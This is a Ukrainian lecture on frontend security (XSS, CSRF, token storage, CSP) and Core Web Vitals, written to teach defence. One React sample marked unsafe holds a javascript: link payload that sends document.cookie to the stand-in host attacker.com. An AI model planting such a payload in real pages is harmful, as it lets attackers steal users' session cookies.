# Лекція 17 (2 години). Безпека веб-додатків (XSS, CSRF, CSP) та оптимізація Core Web Vitals

## План лекції

- 1. Ландшафт загроз фронтенд-застосунків: атаки міжсайтового скриптингу (XSS) та безпека рендерингу;
- 2. Ризики прямої вставки HTML: небезпека `dangerouslySetInnerHTML` та санітизація через DOMPurify;
- 3. Міжсайтова підробка запитів (CSRF) та політика однакового джерела (Same-Origin Policy);
- 4. Безпечне збереження JWT-токенів автентифікації: вразливість LocalStorage проти HttpOnly Cookie;
- 5. Політика безпеки контенту (Content Security Policy — CSP) та захисні HTTP-заголовки;
- 6. Метрики швидкодії Google Core Web Vitals (LCP, INP, CLS): аудит у Lighthouse та практична оптимізація.

## Перелік умовних скорочень

- **UI** (User Interface) — користувацький інтерфейс;
- **DOM** (Document Object Model) — об'єктна модель документа браузера;
- **XSS** (Cross-Site Scripting) — міжсайтовий скриптинг;
- **CSRF** (Cross-Site Request Forgery) — міжсайтова підробка запиту;
- **CSP** (Content Security Policy) — політика безпеки контенту;
- **JWT** (JSON Web Token) — компактний безпечний формат передачі клеймів;
- **LCP** (Largest Contentful Paint) — швидкість відмальовки найбільшого елемента контенту;
- **INP** (Interaction to Next Paint) — затримка відгуку інтерфейсу на взаємодію;
- **CLS** (Cumulative Layout Shift) — сукупне зміщення макета сторінки.

## Вступ

Сучасні веб-додатки оперують конфіденційними персональними даними, банківськими картками та бізнес-логікою. Водночас браузерне середовище є відкритим і потенційно ворожим: будь-який код, що виконується на стороні клієнта, доступний для аналізу зловмисниками, а сторонні бібліотеки з відкритого коду (npm-залежності) можуть містити приховані вразливості supply chain.

Паралельно з безпекою критичним фактором успіху комерційного продукту є його швидкодія. Згідно з дослідженнями Google, якщо час завантаження сторінки зростає з 1 до 3 секунд, ймовірність того, що користувач закриє вкладку (Bounce Rate), зростає на 32%. Сьогодні пошукові алгоритми Google ранжують сайти безпосередньо на базі технічних метрик користувацького досвіду — **Core Web Vitals**.

У цій лекції розглядаються фундаментальні вектори атак на фронтенд (XSS, CSRF), демонструються правила санітизації контенту та безпечного зберігання токенів у HttpOnly Cookie, аналізуються захисні заголовки CSP, а також розбираються практичні інженерні методи оптимізації ключових метрик LCP, INP та CLS.

## 1. Ландшафт загроз фронтенду та атаки міжсайтового скриптингу (XSS)

Міжсайтовий скриптинг (Cross-Site Scripting, XSS) — це тип атаки, за якого зловмиснику вдається впровадити та виконати довільний шкідливий JavaScript-код у браузері нічого не підозрюючого користувача.

### Різновиди XSS-атак

- збережений XSS (Stored / Persistent XSS) — шкідливий скрипт зберігається у базі даних сервера (наприклад, у коментарі до статті `<script>stealData()</script>`) і відправляється кожному користувачу, який відкриває цю сторінку;
- відображений XSS (Reflected XSS) — шкідливий код передається через параметри URL (наприклад, `?search=<script>...`) і повертається сервером без очищення у відповіді;
- DOM-based XSS — вразливість виникає суто на клієнті, коли клієнтський JavaScript читає неперевірені дані (з `location.hash` або `location.search`) і небезпечно вставляє їх у DOM через `innerHTML` або `eval`.

### Вбудований захист React від XSS

React має вбудовану систему захисту: за замовчуванням усі значення, що передаються у фігурних дужках JSX `{variable}`, автоматично екрануються:

```tsx
const maliciousInput = '<script>alert("Hacked!")</script>';

// React відрендерить цей рядок як безпечний звичайний текст,
// замінивши символи на безпечні сутності HTML (&lt;script&gt;...)
return <div>{maliciousInput}</div>;
```

### Де автоматичний захист React безсилий?

Автоматичне екранування захищає лише вміст тегів, але не захищає небезпечні URL-адреси в атрибутах:

```tsx
// ❌ НЕБЕЗПЕЧНО: атака через протокол javascript:
const userWebsite = 'javascript:fetch("https://attacker.com/steal?c=" + document.cookie)';

// Клік по посиланню виконає шкідливий скрипт зловмисника!
return <a href={userWebsite}>Мій веб-сайт</a>;
```

Для запобігання таким атакам усі зовнішні посилання обов'язково повинні валідуватися за допомогою білого списку протоколів (`http:`, `https:`).

## 2. Небезпека `dangerouslySetInnerHTML` та санітизація через DOMPurify

Коли веб-додатку дійсно необхідно відобразити HTML-розмітку (наприклад, текст блогу з WYSIWYG-редактора або відформатовані статті з бази даних), стандартного екранування недостатньо.

React надає спеціальний пропс `dangerouslySetInnerHTML`. Сама назва навмисно містить слово "dangerously", щоб попередити інженера про прямий ризик виникнення XSS.

### Правило санітизації через DOMPurify

Ніколи не передавайте сирий рядок безпосередньо в `dangerouslySetInnerHTML`. Його необхідно обов'язково очищати (санітизувати) за допомогою перевіреної бібліотеки **DOMPurify**:

```bash
npm install dompurify
npm install -D @types/dompurify
```

```tsx
import DOMPurify from 'dompurify';

interface ArticleViewProps {
  rawHtmlContent: string;
}

export function ArticleView({ rawHtmlContent }: ArticleViewProps) {
  // DOMPurify видаляє всі небезпечні теги (<script>, <iframe>),
  // шкідливі атрибути (onerror, onload) та псевдопротоколи javascript:
  const sanitizedHtml = DOMPurify.sanitize(rawHtmlContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'h1', 'h2', 'ul', 'li', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  });

  return (
    <article
      className="prose"
      dangerouslySetInnerHTML={ { __html: sanitizedHtml } }
    />
  );
}
```

## 3. Міжсайтова підробка запитів (CSRF)

CSRF (Cross-Site Request Forgery) — це атака, за якої сторонній шкідливий веб-сайт змушує браузер авторизованого користувача виконати небажану дію на вашому сервісі (наприклад, переказати кошти або змінити пароль).

### Як працює CSRF?

- 1. Користувач авторизувався на `bank.ua`. Браузер зберіг файл Cookie сесії;
- 2. Не виходячи з системи, користувач переходить за посиланням на шкідливий сайт `attacker.com`;
- 3. На сайті зловмисника розміщено приховану форму, яка автоматично відправляє POST-запит на `https://bank.ua/api/transfer`;
- 4. За замовчуванням старі браузери автоматично додавали наявні Cookie до будь-якого запиту на цей домен, і банківський сервер сприймав запит як легітимну дію користувача.

### Сучасний захист від CSRF

- атрибут Cookie `SameSite=Lax` або `SameSite=Strict` — забороняє браузеру надсилати файл Cookie при міжсайтових (cross-site) запитах;
- Anti-CSRF токени — сервер генерує унікальний криптографічний токен для сесії, який фронтенд зобов'язаний додавати у спеціальний заголовок `X-CSRF-Token` до кожного запиту мутації (POST/PUT/DELETE);
- заголовок `Origin` / `Referer` — бекенд перевіряє джерело запиту перед його обробкою.

## 4. Безпечне збереження JWT-токенів автентифікації

Найбільш поширена архітектурна помилка розробників-початківців — зберігання JWT Access Token у браузерному сховищі `localStorage` або `sessionStorage`.

### Чому `localStorage` небезпечний для токенів?

- будь-який JavaScript-код на сторінці має повний доступ до читання `localStorage.getItem('token')`;
- якщо у проєкті спрацює хоча б одна XSS-вразливість або шкідливий код із сумнівного npm-пакета, токен миттєво викрадається і відправляється на сервер хакера;
- зловмисник отримує повний доступ до акаунта жертви на весь термін життя токена.

### Безпечний підхід: HttpOnly + Secure Cookies

Прапорець `HttpOnly` повідомляє браузеру, що файл Cookie **суворо заборонено читати з JavaScript**:

- ні виклик `document.cookie`, ні будь-який сторонній скрипт не можуть прочитати значення токена;
- браузер самостійно підставляє Cookie у заголовки запитів до авторизованого домену;
- прапорець `Secure` гарантує передачу кукі виключно через зашифрований протокол HTTPS;
- прапорець `SameSite=Lax` запобігає атакам CSRF.

### Рекомендована індустріальна архітектура автентифікації

- короткоживучий Access Token (термін життя 5–15 хвилин) — зберігається виключно в оперативній пам'яті клієнтського застосунку (у змінній JavaScript або сторі Zustand). При перезавантаженні вкладки він видаляється;
- довгоживучий Refresh Token (термін життя 7–30 днів) — зберігається в `HttpOnly`, `Secure`, `SameSite=Lax` Cookie на спеціальному ендпоінті `/api/auth/refresh`;
- при відкритті сайту клієнт непомітно викликає ендпоінт оновлення і отримує свіжий Access Token у пам'ять.

## 5. Політика безпеки контенту (CSP) та захисні заголовки

**Content Security Policy (CSP)** — це потужний HTTP-заголовок відповіді веб-сервера, який визначає суворий "білий список" довірених джерел, з яких браузеру дозволено завантажувати та виконувати ресурси (скрипти, стилі, шрифти, зображення).

### Приклад суворого заголовка CSP

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self' https://api.devflow.ua; frame-ancestors 'none';
```

Що забезпечує ця політика:
- `default-src 'self'` — за замовчуванням дозволяє ресурси лише з власного домену;
- `script-src` — блокує виконання будь-яких скриптів із несанкціонованих доменів та забороняє виконання рядків через `eval()`;
- `frame-ancestors 'none'` — повністю забороняє вбудовувати веб-сайт у теги `<iframe>` на інших доменах, що на 100% захищає від атак клікджекінгу (Clickjacking).

### Додаткові обов'язкові заголовки безпеки

- `X-Content-Type-Options: nosniff` — забороняє браузеру вгадувати MIME-тип файлу (MIME Sniffing), запобігаючи виконанню завантажених текстових файлів як коду;
- `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` (HSTS) — змушує браузер використовувати виключно зашифроване HTTPS-з'єднання.

## 6. Метрики Google Core Web Vitals та оптимізація швидкодії

**Core Web Vitals** — це набір стандартизованих метрик від Google, що кількісно вимірюють швидкість завантаження, інтерактивність та візуальну стабільність веб-сторінок.

| Метрика | Що вимірює | Відмінний результат | Поганий результат |
| :--- | :--- | :--- | :--- |
| **LCP** (Largest Contentful Paint) | Час завантаження найбільшого елемента контенту (банер, h1) | <= 2.5 с | > 4.0 с |
| **INP** (Interaction to Next Paint) | Затримка реакції сторінки на кліки, введення тексту та тапи | <= 200 мс | > 500 мс |
| **CLS** (Cumulative Layout Shift) | Сукупна величина неочікуваних візуальних зсувів макета | <= 0.1 | > 0.25 |

### 6.1. Оптимізація показника LCP

LCP найчастіше залежить від часу завантаження великих картинок, фонових банерів або шрифтів:

- оптимізація розміру — стиснення зображень у формат WebP/AVIF із підтримкою `srcset` під роздільну здатність екрана;
- попереднє підвантаження (Preload) критичних ресурсів у тегу `<head>`:

```html
<link rel="preload" fetchpriority="high" as="image" href="/hero-banner.webp" type="image/webp">
```

- використання CDN для кешування та швидкої доставки статичних файлів із серверів, найближчих до користувача.

### 6.2. Оптимізація показника INP

Показник INP замінив застарілу метрику FID (First Input Delay) і відстежує затримку інтерфейсу протягом **усього часу сесії**:

- розбиття довгих задач (Long Tasks > 50 мс) — винесення важких обчислень у Web Workers або розділення на мікротаски за допомогою `scheduler.yield()`;
- пріоритезація UI — використання хуків `useTransition` та `useDeferredValue` у React для звільнення головного потоку під час набору тексту в полях пошуку;
- оптимізація обробників подій — уникнення важких синхронних операцій всередині слухачів `onClick` та `onKeyDown`.

### 6.3. Оптимізація показника CLS

Неочікуване "стрибання" макета дратує користувачів і призводить до помилкових кліків (наприклад, кнопка змістилася в момент натискання):

- завжди вказуйте точні розміри або співвідношення сторін для зображень та відео через CSS-властивість `aspect-ratio`:

```css
img.responsive-banner {
  width: 100%;
  height: auto;
  aspect-ratio: 16 / 9;
}
```

- резервуйте фіксований простір під динамічні рекламні банери та блоки віджетів;
- використовуйте скелетони (Skeleton Screens) точного розміру під час очікування асинхронних відповідей API.

## Висновки

- багаторівневий захист від XSS - автоматичне екранування в React захищає розмітку, проте посилання в атрибутах `href` вимагають суворої перевірки протоколів;
- обов'язкова санітизація через DOMPurify - використання `dangerouslySetInnerHTML` допустиме лише після глибокого очищення HTML надійними бібліотеками;
- безпека аутентифікації - відмова від збереження токенів у `localStorage` на користь прапорців `HttpOnly` та `Secure` убезпечує сесію від викрадення шкідливими скриптами;
- захисні HTTP-заголовки - політика CSP обмежує виконання недовіреного коду, а `X-Frame-Options` повністю усуває атаки Clickjacking;
- оптимізація LCP, INP та CLS - покращення показників Core Web Vitals за рахунок компресії медіа, резервування простору блоків та пріоритезації задач гарантує швидкий відгук та високі позиції в SEO.

## Запитання для самоперевірки

- яка відмінність між Stored XSS, Reflected XSS та DOM-based XSS;
- чому передача значення `javascript:...` у пропс `href` тегу посилання є серйозною вразливістю;
- чому пропс `dangerouslySetInnerHTML` вимагає обов'язкової санітизації через бібліотеку DOMPurify;
- які переваги надає збереження токенів у Cookie з атрибутами `HttpOnly` та `SameSite=Lax` порівняно з `localStorage`;
- яку роль виконує заголовок Content Security Policy (CSP) у блокуванні несанкціонованих скриптів;
- які конкретні метрики входять до стандарту Google Core Web Vitals і які граничні значення вважаються задовільними;
- як правильне використання CSS-властивості `aspect-ratio` допомагає усунути зміщення макета (CLS).
